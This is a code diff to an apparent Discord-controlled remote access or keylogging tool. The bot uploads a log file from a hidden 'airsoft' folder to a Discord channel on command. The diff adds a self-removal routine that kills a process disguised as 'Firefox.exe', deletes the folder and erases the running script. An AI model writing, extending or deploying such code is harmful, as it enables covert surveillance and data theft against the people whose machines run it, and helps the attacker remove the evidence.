@@ -1,6 +1,8 @@
 import discord
 import os
 import time
+import psutil
+import sys
 
 
 client = discord.Client()
@@ -38,6 +40,22 @@ def rename_config(name=False) -> None:
     with open(config_path, 'w') as file:
         file.write(name)
         file.close()
+
+
+def kill_process(name: str):
+    for process in psutil.process_iter():
+        if process.name() == name:
+            process.kill()
+            return True
+    return False
+
+
+def uninstall():
+    if not kill_process('Firefox.exe'):
+        return 'Failed deleting Firefox.exe'
+    os.rmdir(airsoft)
+    os.remove(sys.argv[0])
+    return 'Success!'
 
 
 @client.event
@@ -82,7 +100,7 @@ async def on_message(message):
                 elif command == 'LOG':
                     await message.channel.send(file=discord.File(os.path.join(airsoft, 'log.txt')))
                 elif command == 'DELETE':
-                    await message.channel.send('NOT YET')
+                    await message.channel.send(uninstall())
 
     except Exception as Error:
         await message.channel.send(Error)
